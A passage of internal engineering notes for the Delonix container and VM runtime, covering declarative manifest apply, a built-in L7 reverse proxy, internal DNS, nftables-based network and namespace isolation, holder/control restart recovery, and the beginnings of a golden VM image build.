httpRoutes,dependencies}`), **expanded in `manifest::load`** into the individual docs in dependency
order (inherits the namespace) — the Stack does not survive the load, everything else (apply/ls/describe +
per-Kind apply) sees the children. (3) **`kind: Ingress` = k8s L7 Ingress** (see the reverse-proxy section;
firewall went to `FirewallPolicy`). (4) **`stack apply --dry-run`** — `manifest::render_with_
defaults` round-trips the spec through the typed struct (materializes the `#[serde(default)]`) and prints
the complete YAML without applying (`kubectl --dry-run=client -o yaml` style). Each group exposes a
`pub fn spec_with_defaults(doc) -> serde_yaml::Value` (round-trip through its typed spec, which has
`Serialize`); it covers **all the Kinds** — Network/Volume/Storage/Image/Dependency/Vm/HTTPRoute/
Ingress(k8s)/Egress/FirewallPolicy/Container (flat AND Pod-shape, via `pod_spec_with_defaults`). Only
**`Secret`** stays in the raw spec on purpose (do not reformat `stringData`). `FwDocSpec` gained the field
`direction` (Option, `skip_serializing_if`) so that the round-trip preserves it (the `apply` reads it from
`doc.spec`). `Metadata`/`ManifestDoc` have `Serialize` (+ `skip_serializing_if` on the empty fields).

- **`delonix <container|image|vm|volumes|network> apply [-f ficheiro]`** — applies only the
  documents of that group's Kind (ignores the others). Without `-f`, uses `./delonix-manifest.yaml`
  (clear error if it does not exist).
- **`delonix stack apply [-f ficheiro]`** — applies ALL the Kinds, in this order (dependency
  by name): Network → Volume → Image → Vm → Container. **Fail-fast, no transactionality**: what
  was already applied before an error STAYS applied (no rollback).
- **`apply` semantics: "ensure present".** Diffing exists (`stack plan`, three-way) and
  drift-detection too, since ADR-0088 (A5): `delonix drift` (+`--correct`) and the
  `GitOpsSource.spec.driftPolicy` driven by the timer. What remains OUT of scope is a
  CONTINUOUS reconciler with resident controllers — that is the work of an orchestrator
  (the private equivalent, `delonix-orchestrator`, stays only in `delonix-paas`); the drift here is
  opt-in and daemonless, over the systemd timer (ADR-0021), never a resident process.
  Idempotency per Kind: `Network`/`Container` check existence by name before creating
  (`store.get`/search in the `Store` by `c.name`); `Volume`/`Vm` are already idempotent in the crate's
  own API (`VolumeStore::create*`, `delonix_vm::create`); `Image` with `spec.pull` is idempotent
  (`resolve_or_pull`), with `spec.build` it rebuilds and replaces the tag on each `apply` (there is no build
  cache). `kind: Container`'s `spec.detach` has **default `true`** (different from the CLI `run`,
  where it is `false`) — an `apply` in the foreground would block waiting for the process to finish.
- Complete manifest example and the spec↔CLI mapping: see the doc-comment of
  `bins/delonix-runtime-bin/src/cmd/manifest.rs` and this session's plan
  (`/home/walter/plans/mellow-cuddling-canyon.md`, kept for historical reference).
## Reverse-proxy L7 (`kind: HTTPRoute`)

Declarative HTTP/HTTPS reverse-proxy, **built in**. Routes by `Host` + path prefix to
backend containers. Modules: `cmd/httproute.rs` (`HttpRouteSpec` schema + resolution + `apply`) and
`cmd/ingress_proxy.rs` (the `hyper` proxy + the lifecycle). Surface: `delonix net httproute
ls/apply/rm` + `kind: HTTPRoute` in `stack apply`.

**`kind: Ingress` = k8s-style L7 Ingress (BREAKING v0.7.x).** As of this series, `kind: Ingress`
is the **networking.k8s.io/v1** form (`spec.rules[].host` + `http.paths[].backend.service.{name,port.
number}`, `spec.tls[]`, `defaultBackend`, `ingressClassName`) and **compiles to the same L7 proxy**
(`httproute::ingress_to_httproute`/`ingress_spec_of` → `HttpRouteSpec`; collected in
`parse_and_validate` alongside `HTTPRoute`). Limitations inherited from HTTPRoute: **a single cert (no
SNI)** — the 1st `tls[]` decides selfSigned/secretRef; `pathType: Exact` is accepted but treated as a
prefix; named ports error out (use `port.number`). **Migration**: the L4 firewall that PREVIOUSLY lived
under `kind: Ingress` moved to **`kind: FirewallPolicy` with `direction: ingress`** (already an alias);
`firewall::apply` no longer handles `Ingress` (only `Egress`/`FirewallPolicy`); `validate_graph` and the
drift-guard moved accordingly; `examples/firewall.yaml` migrated, `examples/ingress.yaml` is the
new L7 form. The `delonix net ingress` CLI (publish/allow/deny) **stays L4** — only the manifest *Kind*
changed meaning.

- **The proxy is pure `hyper`** (http1 server + legacy `hyper-util` client), **confined to the bin** —
  `hyper`/`hyper-util`/`tokio`/`tokio-rustls`/`rustls-pemfile`/`rcgen`/`bytes`/`http-body-util` are
  deps of `delonix-runtime-bin`; they **were already in the tree** (transitive via `delonix-cri`/`tonic`),
  so **zero new supply-chain surface** (except `rcgen`/`rustls-pemfile`, tiny). The
  engine crates stay dep-clean.
- **Where it runs:** a `delonix ingress-proxy` process (HIDDEN subcommand) launched **inside the
  holder's netns** (`infra::infra_join_argv` + detached `setsid`; `nsenter` does an EXEC → stable PID,
  signalable from the host). There it reaches the backends by internal IP; the entry ports are published on the
  host via `slirp add_hostfwd` (the proxy listens on `0.0.0.0` and catches `SLIRP_IP` — the holder **has no
  `input` chain**, so no DNAT). Persistent infra like the slirp/holder, it only exists when there is an
  HTTPRoute — it honors "daemonless".
- **Hot reload (SIGHUP):** the routes live in a swappable table (`Arc<RwLock<Arc<Vec<Route>>>>`);
  `httproute apply` on a live proxy rewrites the config and sends SIGHUP → only the ROUTES reload (same
  PID, no downtime). **Listeners and TLS are FIXED at startup** (the sockets are bound and the TLS
  material loaded once), so changing them **restarts the proxy** — `converge_all` does it and SAYS so,
  because in-flight connections are cut. It is the substrate of container auto-registration.
  - **It restarts with `stop_keeping_sources` and never with `stop()`**, and the distinction is not
    cosmetic: the latter is a teardown and also deletes `auto.json`, i.e. it would tear down ALL the routes
    auto-registered by `container run --expose` — services unrelated to the document being touched, which
    would only come back when each container was restarted.
  - **`hot_fields` had no arm for `HTTPRoute`/`Ingress`**, and the whole chain fell apart behind it: no
    hot field → any change planned a `Replace` → refused without `--replace` → and WITH it the
    `destroy_one` errors, because a COLLECTIVE config has no per-document teardown → so the
    `converge_all` arm in `stack.rs` was unreachable. The `rules` converged anyway, but via the old
    per-Kind `apply` chain — the «converged via the wrong path and the result looked right» pattern
    that `Vm`/`FirewallPolicy`/`ShareVolume` had already shown. There is a test requiring every field
    compared to be hot.
  - **ETERNAL DRIFT, in the most common case there is**: `resolve_config` applied the defaults
    (`:80`, plus `:443` if there was `tls`) and `desired()` read `spec.entrypoints` RAW — a
    manifest without `entrypoints` gave `desired=""` against `actual="80"`, i.e. a difference in EVERY
    plan of a file nobody touched. One rule, one owner: `effective_entrypoints`.
- **TLS terminates at the proxy** (`tokio-rustls`, `ring` provider): `spec.tls.mode: selfSigned` (generates a
  multi-SAN cert with `rcgen` covering all hosts) or `secretRef` (reads `tls_crt`/`tls_key` — or
  `tls.crt`/`tls.key` — from a `kind: Secret`). v1 limitation: **a single cert** (no SNI selection).
- **Resolution:** `httproute::apply` runs LAST in `stack apply` (it needs the containers already
  created) and resolves each `backend.service` → `ip:port` from the record. **Only backends with an IP on the SDN**
  (on a custom network) work — those on `--net host/none` are not reachable by the proxy; clear error.
- **Lifecycle** (`ensure_running`/`stop`): idempotent (alive → SIGHUP; dead → spawn + publish),
  with a **PID identity guard** (`/proc/<pid>/cmdline` contains `ingress-proxy`, so a recycled PID doesn't
  take a SIGHUP/SIGTERM), startup confirmation (it doesn't declare "serving" if the proxy died
  on the bind) and idempotent publish. `httproute rm` kills the proxy + unpublishes — and **says only
  what it observed**: it reads `is_running` from both instances BEFORE `clear_manual` (see `rm_report`),
  because the absence of a proxy AFTER the clear is a state the command itself produces. Without that it
  announced «proxy stopped and ports unpublished» even when the `apply`'s `spawn_proxy` had failed,
  when the proxy had already died, and for the host-netns instance, which connects to the loopback
  directly and never publishes any port. For the same reason, a proxy running AFTER the clear also doesn't
  prove it was running before: with auto-registered routes surviving, `rebuild` skips the `stop` and
  `ensure_running` does a `spawn_proxy` if there is no live pid — i.e. the `rm` STARTS the proxy and
  publishes the ports, and then says so instead of «proxy stays up».
- **Security:** `host`/`path`/`backend.service` go through `valid_host`/`valid_path_prefix`/
  `valid_service` before any use; **hop-by-hop** headers (Connection/Transfer-Encoding/
  Upgrade/…) stripped in both directions (anti-smuggling); anti-slowloris timeouts (TLS handshake,
  header-read, backend→504). **WebSocket/upgrade is NOT yet tunneled** (follow-up).
- **Proven E2E** (real `httpd` container on a custom network): `httproute apply` → proxy in the holder →
  `curl host:<porta>` with a `Host` header → backend; HTTPS with `curl -k` (TLS negotiated, self-signed);
  re-apply reloads via SIGHUP (same PID); `httproute rm` kills and unpublishes. See `examples/httproute.yaml`.

**Container auto-registration (`container run --expose <porta>`) — DONE.** A container with
`--expose` is auto-registered on the L7 proxy under the internal FQDN `<nome>.<namespace>.delonix.internal`,
with hot reload (SIGHUP), removed on `container rm`. The final config is composed of TWO sources
that **never erase each other**: **MANUAL** (`kind: HTTPRoute` → `set_manual`/`manual.json`) + **AUTO**
(`--expose` → `auto_register`/`auto.json`, read-modify-write under **flock** against lost-update).
`rebuild()` merges the two → `ensure_running` (or `stop` if everything ended up empty). `httproute rm` clears only
the MANUAL part (the auto ones survive). The auto-routes are served on **:8080** (not :80 — under rootless the
slirp doesn't publish ports <1024). `--expose` requires `--net <rede>` (warns otherwise) and re-registers on
`start`. Proven E2E: `--expose` → `curl host:8080 -H 'Host: <fqdn>'` → container; multiple
auto-routes + MANUAL coexist in the same proxy. **Limitation**: adding an auto-route with the proxy ALREADY
on another listener doesn't bind the new port (SIGHUP reloads routes only — inherited from the fixed-listeners).
It makes Delonix a k8s substitute (DNS+ingress) in small environments.

## Internal DNS / service discovery (`<nome>.<namespace>.delonix.internal`)

The holder's DNS (`infra::dns_server_main`/`dns_resolve`) resolves container/VM names to the SDN
IP — k8s-style service discovery (CoreDNS), with nothing to configure. Schemes:

- **`<nome>`** (plain) and **`<nome>.delonix.io`** (legacy) → resolve the container by name, in
  ANY namespace (long-standing behavior, preserved).
- **`<nome>.<namespace>.delonix.internal`** → resolves AND **verifies the namespace** (isolation also
  in the DNS: resolving with the wrong namespace gives **NXDOMAIN**). `parse_internal_name` (pure, tested)
  splits name/namespace.
- **Anti-hijack**: the per-namespace split only applies to the `.delonix.internal` suffix — an
  EXTERNAL domain (`api.github.com`) is **never** hijacked by an `api` container in the `github.com` ns;
  it stays as a whole name (doesn't match) and forwards.
- **Proven E2E**: `api.prod.delonix.internal` → correct IP; plain `api` resolves; wrong
  namespace → NXDOMAIN. It is the foundation of **auto-registration** (each HTTP container gains an FQDN + route on the
  proxy — next slice).

## Directed reachability (`kind: Dependency` / `KnowDepends`)

`kind: Dependency` (alias `KnowDepends`) — **DIRECTED** communication between containers, unlike
`Network` (bidirectional). `spec: { from, to (escalar ou lista), ports?, proto? }`: `from`
reaches `to`, but `to` is not exposed to the other containers on the network. Classic case: the app knows
the DB, the DB is not reachable by the other apps on a shared network (`cmd/dependency.rs`).

- **Sugar over the per-container L4 firewall** (zero new dataplane): it compiles to, on the `to`, a
  **default-deny** ingress (protects) + an `allow` for the `from`'s IP. It reuses `ContainerFw`/`infra::
  apply_firewall` via `firewall::apply_container_ingress` (shared helper). Several `Dependency`
  to the same `to` **accumulate** the `allow`s. The return of the conversation flows because the SDN is stateful.
- **Kind alias** `KnowDepends`→`Dependency` (`canonical_kind`). The graph validates `from`/`to` as
  containers; `stack apply` runs it after the firewall (it needs the IPs). See `examples/dependency.yaml`.
- **Proven E2E**: open network (app AND other reach db) → after `Dependency app→db`, app OK and other
  BLOCKED (timeout).
- **v1 semantics and limits**: it guarantees "`to` protected, only the declared `from`s reach it". Blocking
  the **reverse direction** (`to` does not INITIATE to `from`) is completed with **Namespaces**
  (universal default-deny isolation — next slice). A `to` that is simultaneously the target of an
  explicit `kind: Ingress` **and** of a `Dependency` warns (the Dependency is authoritative and overrides the
  inbound direction). Removing the `Dependency` does **not** unprotect the `to` ("guarantees present").

## Path between NETWORKS (`kind: NetworkRoute` / `network route`, ADR-0013 tier B)

The grain above `Dependency`: that one links two **workloads**, this links two **networks**. Networks are
isolated from one another by default; a `NetworkRoute` declares that one may reach another. Directed,
with the same asymmetry — `from` initiates, the return flows (established), `to` does not initiate back.
Surface: `delonix network route <from> <to>` (`--rm` closes) + `kind: NetworkRoute` with
**only two fields**, `from`/`to`. Module `cmd/netroute.rs`, dataplane in `infra::network_route`.

**The rule that makes it compose with isolation instead of undermining it, and the one thing to take away
here: a route says the packet CAN cross; it never says it is PERMITTED.** The per-workload `fwcont`
chains still decide, and a namespace boundary crossed by a route still needs its `Dependency` or policy.
They are two questions in series, in two different chains, and that is why they are two Kinds and not a
single field of one:

```
fwdeny (-10)  ← NetworkRoute:   as duas redes têm caminho?    senão: drop
fwcont  (-5)  ← FirewallPolicy: este workload aceita isto?    senão: drop
```

Whoever merges them loses the ability to express «there is a path but it is closed», which is the normal state
of a segmented network — the same separation AWS makes between route table and security group.

- **Isolation between networks is not the ABSENCE of a route — it is an explicit pair-to-pair drop**, and it was the
  ADR spike that measured it (inside the holder `ip_forward` is already 1, the routes of the two bridges are already
  there, and the four `forward` chains are `policy accept`). So OPENING a path is an
  **exemption**, not a dataplane: one element in the `@netpair` verdict map. Constant cost — the old
  mesh was 73 rules for 8 bridges, all traversed per packet; today it is two rules
  regardless of how many networks exist (the same move `@fwmap` had already made).
- **The exemption is consulted in BOTH chains** (`fwdeny` -10 and `forward` 0), and forgetting it broke
  traffic WITHIN the network itself: an `accept` **is not terminal between base chains**, so exempting
  only in `fwdeny` let the packet go on to `forward`, which has `policy drop` — 100% loss, measured. There
  is a test requiring both occurrences (`a_isencao_e_consultada_nas_duas_chains_...`).
- **Its own document and not a `routes:` field in `kind: Network`**: a route is a RELATION and does not
  belong to either end. Expressible from both sides is how two documents come to disagree
  about the same route — the bug `FirewallPolicy` already pays for by REFUSING two policies
  for the same (target, direction).
- **The `via:` from the ADR draft does not exist.** The spike made it unnecessary and what remained were
  `from`/`to`; anyone copying the ADR's YAML writes a field the engine does not know.
- **It now has its own state, and that is what makes it reversible.** This entry used to say «it has no state
  of its own to read» and that `presence_of` classified it as `declarative` (`-`) — no longer true: it
  gained a record (`infra::RouteDef`, at `<root>/ingress/routes/<from>--<to>.json`), the
  `presence` answers `yes`/`no` with the live state alongside, and it left the `wait`'s `DECLARATIVOS` list
  (leaving it there would deem ready a route that does not yet exist). **The missing arm in the
  `presence` was a real bug** — it fell into `_ => ("?", "unsupported kind")`.
- **CLOSED (the previous entry described the defect and asked for this update).** It is now in
  `CONVERGING_KINDS`, with `desired`/`actual`, ownership by `delonix.io/stack` and an arm in the
  `destroy_one`: removing the route from the manifest and running `apply --prune` **closes it**, and the `destroy`
  too. A hand-created route carries no stamp and survives both.
  - **The `actual` comes from the REGISTRY and not from `@netpair`**, and the reason inverted the obvious
    design: the map lives in the holder's EPHEMERAL netns, which is born on demand and dies with the last container — on
    an idle node the probe returns empty, the plan reads «the route disappeared» and `--detailed-exitcode` stays at
    2 forever, with the drift gate in CI red every day. It is the problem that
    `EgressState` already had, with the same answer: persist and restore in `ensure_net_bridge`. The cost is
    stated where it is paid — deleting the element by hand still reads as `NoOp`, and the live state is
    what `stack ls` shows.
  - **The restore uses `bridge_name` (pure) and not `resolve_net`**: the latter does I/O and would require the
    other end already recreated, when an element of `@netpair` is just an `ifname` string. Validated
    live — the route came back with the bridge on the other side still nonexistent, which is the normal case (the
    bridges are reborn one at a time, as the workloads connect).
  - **The identity is the PAIR, not `metadata.name`.** With the document name, renaming it gave
    `Create`+`Delete` for the SAME nft element — and since `--prune` runs last, it would
    close the path the apply itself had just opened. Hence the refusal of two documents for the same pair.
  - **`network_remove` forgets the network's routes**, and deletes the ELEMENT beyond the registry: the
    `bridge_name` is deterministic, so leaving the pair in the map made the path REOPEN by itself on the
    next network with the same name. It was measured after a `destroy` — the first version closed only
    half.
  - Chaos scenario `stack_netroute`, which runs the CYCLE (each step in isolation returns 0 even with the
    defect). **Method lesson**: the first reversion I tried — `ownable: false` — left it
    GREEN, because `stamp` runs for every converging Kind and the route gets an owner anyway; what
    `ownable` governs is ADOPTION, covered by a unit test. The reversion that counts is removing it from the
    `CONVERGING_KINDS`, and then it fails with the exact symptom («after the prune only the imperative
    route was expected, there are 2»).
- **CLOSED**: the exemptions now have a `counter` (the flag in the map declaration gives PER
  ELEMENT counters, verified live before writing code), and `stack ls` shows it —
  `open, no traffic yet` against `open (2 packets)`. The counter goes BETWEEN the key and the verdict, which
  is where a parser written for the old format breaks; there is a test with the REAL captured format and
  with the old-holder case (no counters) reading as zero. Note for whoever reads the number: the
  RETURN does not go through the pair (it matches earlier on `ct state established`), so 3 pings give 2.
- Example: `examples/netroute.yaml` — declares the route **and** the `Dependency`, on purpose: removing one
  of them and reapplying is the fastest way to see that the two questions are truly independent.

## Namespace isolation (`metadata.namespace` / `--namespace`)

Logical **isolation** namespace (default `default`), k8s-style: containers from different namespaces
**cannot reach each other** (even on the SAME network); only a `kind: Dependency` pierces the boundary,
and in one direction only. Surface: `container run --namespace <ns>` + `metadata.namespace` in the manifest.
Core in `ContainerFw.namespace` + `infra::fw_chain_body`/`ns_set_join`.

- **Unified per-container model** (design decision — nftables `accept` is not terminal between
  base chains, which prevents a separate `nsdeny` chain from composing with the Dependency): isolation
  lives in EACH container's dedicated chain (first-match terminal). A container outside `default`
  gains, on ingress: `ip saddr @dlxns_<ns> accept` (same namespace) + `ip saddr @dlxall ct state
  new drop` (drops NEW connections from containers in ANOTHER namespace). The `ct new` exempts the return
  (established), and `@dlxall` limits the drop to container sources (gateway/DNS/internet pass).
- **nft sets**: `@dlxall` (all container IPs) + `@dlxns_<hash>` per namespace, maintained in the
  `do_attach` (`ns_set_join`: removes the IP from any prior `@dlxns` → re-attach/ns change
  fixes itself without cleanup on detach). Membership is dynamic — the `@set` rules evaluate the
  current composition, without re-applying the chain when a peer joins.
- **Composition with Dependency/Ingress**: an EXPLICIT policy is authoritative and overrides the
  namespace default (`has_explicit_in` short-circuits the namespace rules). Thus a
  `Dependency app→db` pierces the wall (allow of the app's IP in the db's chain) and the **reverse
  direction** db→app stays blocked by the app's namespace rule — the directed guarantee the Dependency
  alone did not give.
- **Proven E2E** (isolation battery, 4 containers, 2 namespaces): same-ns → OPEN; cross-ns →
  BLOCKED (timeout); Dependency pierces the cross-ns; reverse direction blocked; return flows. The
  `container start` **re-applies** the persisted firewall (isolation survives the restart).
- **`default` = open SDN** (everything in the same namespace) → **unchanged behavior** for those who don't
  use namespaces. A `default` attach keeps the 5-token form of the control-line (compat with an old
  holder in an in-place upgrade; only namespaced attaches require the new holder).
- **Pods and VMs are inside too (v0.40.0)** — before they were left out, each for its own reason:
  - **Pods were META-connected, which is worse than disconnected.** `create_pod` already passed the
    namespace to `infra::attach_container`, so the pod's IP ENTERED `@dlxall`/`@dlxns_<ns>`
    — the OTHERS' chains already refused connections coming from it. What never existed was its
    OWN chain: the isolation rules live in each workload's chain, and with no chain nothing dropped
    the INCOMING traffic. A boundary open in one direction only, which is the same as open. **Measured before the
    fix** (3 pods of 1 container on the default bridge): `podA(teamA) → podB(teamB)` **REACHABLE**,
    with the holder's sets perfectly correct (`@dlxall={.2,.3,.4}`, teamA=`{.2,.4}`,
    teamB=`{.3}`) and `@fwmap` **empty**. Fixed with `pod::apply_pod_namespace_isolation`,
    keyed by the pod's NETNS NAME (not by a member's id: the netns holds the address,
    all members share it, and the verdict map is keyed by IP — one entry is all that would
    fit). The teardown was already covered (`remove_pod` → `detach_container` → `unfirewall`).
  - **VMs had no namespace at all** and there was a structural obstacle: the VM's IP comes via
    **DHCP**, so at `vm_attach` time it is not yet known. Solved by the fact that the DHCP server
    is OURS and native (`dhcp_serve`, in Rust inside the holder) and the lease is **deterministic from the
    MAC** — `infra::dhcp_lease_ip` computes it on the host side, before the guest boots. The same
    arithmetic was **duplicated in two places** (`dhcp_serve` and `dhcp_ip_for_mac`) and this session
    almost made a third: now there is ONE function and the three consumers (server, `vm ls`, attach)
    go through it. Two copies would diverge the day the pool changed, and the symptom would be the worst
    possible — a VM with a firewall at an address nobody uses, reported as isolated.
  - **`vm create --namespace` + `metadata.namespace` in `kind: Vm`**; `Vm.namespace` persisted
    (`#[serde(default)]` = `default`, which is exactly what old records were) and reconstructed
    by `config_from`, with a dedicated regression test — the namespace disappearing on the
    first `start` would be the 4th occurrence of the already-documented trap (`-v`, `-p` on a custom network,
    extra networks).
  - **Only the `cloud-hypervisor` backend** — a libvirt VM lives on `virbr0`, in the HOST's netns, a different L2
    that this engine does not program. `--namespace` there is **REFUSED with a directed error**, never
    accepted-and-ignored (the trap this repo has already had to fix three times:
    `--security-opt seccomp=`, `-v …:z`, `--network-alias`).
  - **Holder compatibility**: the `vmtap` control line grows to 6 tokens only when there is
    actually a namespace to apply (`vmtap_line`, pure and tested) — the same idiom that `attach`/
    `attach-extra` already used. Against an old holder, a namespaced VM fails **LOUD**
    (`invalid control command`), never silently boots without isolation. Confirmed live.
  - **Validated live (2026-08-05)**: pods — cross-ns blocked in BOTH directions, same-ns open,
    gateway intact, `@fwmap` with one chain per pod; VMs — a real `vm create --backend cloud-hypervisor
    --namespace teamA`, chain installed at `10.200.254.20` (the predicted lease, and the same one the
    `vm ls` reports), and **real traffic** against that address through the installed chain:
    same-ns `1 packet accepted` by the `@dlxnse20c4037` rule, cross-ns + `default`
    `4 packets dropped` by the `@dlxall ct state new` rule. A new chaos scenario
    (`pod_namespace_isolation`) that **fails with the fix reverted** and passes with it.
  - **What was NOT proven with a real guest** (note from 2026-08-05, PARTLY SUPERSEDED: with
    the EDK2 `CLOUDHV.fd` the golden ALREADY boots on CH — see «A network's subnet now counts»):
    at the time no image on this host booted on Cloud
    Hypervisor (the golden claimed to be libvirt-only because there was no `hypervisor-fw`), so the target at the VM's
    address was a real veth on the holder's bridge, not the guest. What that leaves unconfirmed is
    only the `tap`→guest path, which is the same as any CH VM with no namespace at all; the chain,
    the address and the kernel's decision were exercised with real packets.
- **Recovery from a holder respawn (v0.41.0)** — v0.40.0 brought pods inside the
  isolation and that made the next question visible. **Measured before any code**: the
  reconciliation printed `recovered 1 container(s)` while a pod beside it was `Up 32 seconds`
  with `Network unreachable` — alive, no network, no chain, and **without a line saying so**. A
  recovery that reports success on top of a workload it abandoned is worse than none.
  - **Root: `Container.pod` was never persisted.** The field has always existed, `describe`
    always printed it, and NOTHING assigned it — the only trace of membership on disk was a label.
    **Fourth occurrence of the same trap** (`-v` not persisted, `-p` on a custom network, extra
    networks lost on restart): *state needed to RECONSTRUCT the resource must be
    persisted, not only used at creation*. Consequences reproduced: `describe` of a member did not
    show any pod, and `container restart` of a member died with `clone failed: EPERM`
    leaving it **`Dead` with no way back**.
  - **`cmd_start` gained a pod branch** (mirror of the custom-network branch): it re-enters the shared
    netns; if the holder no longer serves it, it recreates it WITH the member's namespace, so the
    isolation comes back with it. `reconcile_after_respawn` now accepts pod members as
    candidates (`is_reattach_candidate` gained the `pod` parameter — a member has an empty `network`
    in the record, it is the `pod` that proves it has a thread inside the holder).
  - **LATENT BUG caught while wiring this: `reexec_start` ignored its own `netns` parameter** and
    used the `id`. It worked by coincidence — the only caller passed a netns equal to the id. A
    pod member is the first case where they differ. Same family as the dead-public-helpers-with-a-
    defect this repo has already deleted twice (`publish_port_allow`, `reap_orphan_hostfwds`). The
    failure path gained `owns_netns`: only a netns of ours is torn down — a pod's is
    shared, and tearing it down because one member didn't come back would take the network away from the peers.
  - **A BUG THAT ONLY A TWO-MEMBER POD SHOWS**: the idempotency guard asked INSIDE the
    loop «does the holder serve this netns?», and the answer turns to *yes* as soon as the FIRST member
    recovers — all subsequent ones were skipped as healthy inside the dead netns
    (`recovered 2 container(s)` with `pa-c0 → Network unreachable`). The question is now asked
    ONCE, **before** the loop: there either the holder served the netns (nothing died — all are skipped) or
    it did not (they are all stranded — all restart). For a container, whose netns is its own,
    snapshot and live query are equivalent. **Method lesson**: an idempotency guard that queries
    state the loop itself MUTATES is not a guard — and a scenario with ONE element never reveals it;
    the chaos scenario uses two on purpose.
  - **Validated live**: `restart` of a member with a live peer (the peer doesn't lose a packet, the
    member returns to the same pod IP); holder respawn with a 2-member pod + a container on a custom
    network → **all three recovered**, isolation reconstructed (cross-ns blocked in both
    directions). Chaos scenario `pod_holder_respawn`, which fails with the fix reverted.
  - **Still to do**: recovery is by RESTART, not by adoption (adopting the live netns is
    impossible in the kernel under rootless — measured and documented since v0.39); and the **VMs remain
    outside reconciliation** (the `tap` dies with the holder and nothing restores it).
- **The holder is no longer a single point of failure (v0.42.0)** — see the «Pin/control» section below.
  A control-plane restart no longer touches any workload; only the death of the *pin* forces a
  rebuild.
- **v1 limitations (known)**: (1) `default↔non-default` is **asymmetric** (`default` is the
  "public" namespace — reachable from inside any namespace, but it does not reach into
  them); (2) if the PIN dies, VMs are not recovered (containers and pods are, by restart).

## Pin/control: the holder is no longer a single point of failure (v0.42.0)

Until v0.41.0 ONE process held the namespaces **and** ran the control plane. Restarting the
control plane — crash, `kill`, in-place upgrade — destroyed the netns and permanently
disconnected all the node's workloads. v0.41.0 treated the symptom (recover by restart);
this treats the cause.

**The measurement that inverted the premise** (done before writing code, with a live CH VM): killing
the holder leaves **everything** standing — the VM process, the netns (same inode), `delonix0`, the VM's
`tap`, the slirp's `tap0` with IP and route, the `nft` ruleset with the isolation chain, and
`slirp4netns` itself. And one enters that orphaned netns **without privilege**, via a live member
(`nsenter -t <pid> -U -m -n`). What killed the network was the following `ensure_up` **throwing away a
working netns** to build another. It fixes in passing an over-broad claim that was on
record: what is impossible under rootless is `ip netns attach` from the host (CAP_SYS_ADMIN over the
dead userns); **entering** from a live member is another operation and it works.

- **`delonix netns pin`** does the `unshare` and goes to sleep — no sockets, no threads, no state.
  **`delonix netns control`** runs inside it via `nsenter` and is restartable (control socket,
  DNS, RA, DHCP per bridge). `ensure_up` has three cases: pin+control alive (nothing); pin alive and
  control absent (**restores only the control**); pin dead (rebuild + recovery by restart).
- **The pin's pidfile keeps its historical name on purpose** (`holder.pid`): it is the pid that every
  `nsenter -t <holder>` in the tree targets (`join_argv`/`infra_join_argv`/`disable_ipv6_live`) and
  is now the one that NEVER changes. Renaming it would be touching every consumer to say the same thing.
- **Valuable side effect**: the pin has no versioned behavior, so **old pin +
  new control is safe by construction** — the in-place upgrade trap from v0.34.2 disappears
  from the normal path (the legacy-socket detection stays, for a pre-split holder).
- **The reattach does NOT repeat the destructive steps** (each one verified, not assumed):
  `mount -t tmpfs none /run` would mount a SECOND tmpfs on top, hiding `/run/netns` — the named netns
  of every pod and every `--net <custom>` container on the node; `ip link add`/`ip addr add`
  return `File exists` and would abort the startup; re-applying the base ruleset re-adds the dispatch rules
  of `fwcont` (the ruleset MERGES into the table — it has no `flush`, and that is why the
  containers' firewalls survive at all). On the reattach only what is **local to the
  process** is rebuilt: the DHCP servers, which are threads.

**Three bugs that only live validation revealed** — all three of the same family («X is not Y»):

1. **`/sys/class/net` does not reflect the process's netns.** It reports the netns of whoever
   **mounted** the sysfs, and the pin never remounts `/sys`: from inside the control that directory is the HOST's. The
   probe said «empty netns» for one that had a bridge, and the control died on `ip link add
   delonix0: File exists`. It now asks via netlink (`link_exists`, `ip link show`).
2. **`capture()` returns `Ok` even when the command fails** — it doesn't look at the exit status at
   all. The 2nd version of the probe used `.is_ok()` and was ALWAYS true: in a virgin netns the
   control took the reattach, built nothing, and `net netns up` announced `ingress UP` over
   a netns with no bridge. The OUTPUT is now read. **Note for whoever touches this**: `capture` is lenient
   by design and has many callers — always check what it returns, never the `Result`.
3. **A socket file outlives the process that created it.** `wait_for_control_sock` was
   `path.exists()` — the 3rd appearance of the same mistake in this base (after `status()` by pidfile and
   `container.userns`). It only started to hurt when the split gave the control a way to die on its own:
   with the orphaned file passing, `ensure_up` returned `ingress UP` over a node WITHOUT a control
   plane — dataplane fine (that's the goal), but no attach/publish/DNS and no warning. It now does
   a real `connect`; the function left with no callers was DELETED, not left waiting.

**Validated live** with a pod + a container on a custom network + a CH VM at the same time: `kill -9` on the
control → pin `77461→77461`, control `77464→77722`, and **VM/pod/container with the PID unchanged**,
network intact, isolation preserved, new work accepted immediately. Killing the PIN still falls
into the full rebuild. Chaos scenario `control_restart`, which compares **PIDs** and not just
connectivity — a recovery-by-restart would also leave the network working and would be
indistinguishable otherwise. Harness: 17/17.

## Golden VM image (`delonix vm image`)

**Renamed to `delonix vm image` in Sprint 9 of the CLI restructuring (below) — this section
uses the spelling from when it was written and stays as is, being history.** `delonix vm image
ls|pull|push|build` manages VM images apart from container images
(`ImageStore`) — one loose `.qcow2` + a `.json` of metadata per image, in `<root>/vm-images/`
(`bins/delonix-runtime-bin/src/cmd/vmimage.rs`, `VmImageStore`). It lays the ground for
`delonix cluster kubeadm` (section "Cluster kubeadm" below — already implemented): the image already ships
with `kubeadm`/`kubelet`/`kubectl` and `delonix-cri` running as a systemd service — **starting a
node does no installation at all**, only `kubeadm init`/`kubeadm join`.

- **`build`**: downloads the Ubuntu cloud image (`cloud-images.ubuntu.com/releases/<release>/
  release/`, cached in `<root>/vm-images/_base/`, validated against `SHA256SUMS` — never accepts a
  download without verifying), flattens it (`qemu-img convert`, with no dependency on a local backing-file
  in the final artifact), and runs `virt-customize` with a list of steps built in Rust by
  `k8s_customization_steps()` — **this is the "100% parameterized"**: `--extra-package`/
  `--extra-run` extend it without touching the code. It installs the `pkgs.k8s.io` repository +
  `kubeadm`/`kubelet`/`kubectl`, turns off swap, loads `overlay`/`br_netfilter` + the sysctls
  required by the kubelet/CNI, injects the `delonix-cri` binary (see below) + the systemd unit
  (`dist/delonix-cri.service`, `systemctl enable`), and creates the `delonix` account in `sudo` with
  `NOPASSWD` — **with no password at all, neither it nor root** (see «The base image carries no
  credentials» below; this line used to say `root`/password `delonix` and is no longer true).
  cloud-init stays ACTIVE in the
  image (the build runs only once; the first-boot cloud-init of EACH VM still applies
  hostname/SSH-keys — see `delonix vm create` below). It also configures, in `/etc/bash.bashrc`
  (interactive login AND non-login bash — serial console and SSH), the **autocomplete + `k` alias**
